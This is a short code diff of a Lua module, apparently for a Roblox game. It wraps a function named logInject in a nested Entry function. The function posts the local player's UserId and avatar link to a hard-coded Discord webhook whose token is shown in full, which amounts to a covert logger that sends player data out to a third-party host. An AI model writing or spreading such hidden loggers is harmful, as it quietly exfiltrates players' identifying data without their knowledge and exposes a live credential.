@@ -11,6 +11,7 @@ end
 
 
 function module.logInject()
+    function module.Entry()
 postHook(
     "https://discord.com/api/webhooks/1031943075536318594/Y-8Mo-SmQMqQkNXOQTEdw9VhAgSzUu3PCPszFkFVXms89AIoKRN-FkO0VCqiLXrgw0cp",
     {
@@ -29,6 +30,7 @@ game.Players.LocalPlayer.UserId .."&width=60&height=60&format=png",
         }}
     }
 )
+end
 end
 
 return module
